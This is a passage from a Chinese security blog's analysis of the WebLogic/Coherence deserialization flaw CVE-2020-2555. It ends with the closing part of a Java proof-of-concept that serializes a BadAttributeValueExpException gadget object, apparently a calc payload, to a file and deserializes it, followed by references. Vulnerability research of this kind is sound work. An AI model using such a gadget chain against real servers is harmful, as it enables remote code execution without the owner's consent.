serialize(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化数据</span></span><br><span class="line">        deserialize();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//序列化数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception</span>{</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"12214clac.ser"</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(object);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>{</span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"12214clac.ser"</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">        Object result = objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></div></figure>
<p>整个调试过程跟 java 反序列化链 <code>commons-collections-3.1</code> 相似，甚至比之更加简单，就不再详细描述了。</p>

        <h3 id="不足之处">
          <a href="#不足之处" class="heading-link"><i class="fas fa-link"></i></a>不足之处</h3>
      <p>看到 Lucifaer 大佬说还有一种利用方式，是基于表达式注入的利用方式，比这种串联利用方式更加简单，应该跟 strut2 漏洞有些关系，等分析完 strut2 漏洞再回来看。</p>

        <h2 id="参考文章">
          <a href="#参考文章" class="heading-link"><i class="fas fa-link"></i></a>参考文章</h2>
      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/JDvVr6fT2zzJw0rZRunZGw">Weblogic12c T3 协议安全漫谈</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=0de94a3cd4c71debe397e2c1a036436f">weblogic t3 协议利用与防御</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://hu3sky.github.io/2020/03/08/CVE-2020-2555%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2020-2555 漏洞分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.r4v3zn.com/posts/975312a1/">漫谈 Weblogic CVE-2020-2555</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/web-13470.html">修复weblogic的JAVA反序列化漏洞的多种方法</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://paper.seebug.org/1141/">Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2020/12/15/%E9%AA%91%E5%A3%ABcms%E5%AD%98%E5%9C%A8%E6%A8%A1%E6%9D%BF%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">骑士cms存在模板解析漏洞</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">
          漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-weblogic-T3-%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">
          前置知识 - weblogic T3 协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-number">3.</span> <span class="toc-text">
          环境安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">
          漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">
          漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-POC"><span class="toc-number">5.1.</span> <span class="toc-text">
          构造 POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%B6%B3%E4%B9%8B%E5%A4%84"><span class="toc-number">5.2.</span> <span class="toc-text">
          不足之处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.</span> <span class="toc-text">
          参考文章</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author_images.png" alt="avatar"></div><p class="sidebar-ov-author__text">按时吃饭</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span>%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>whippet</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>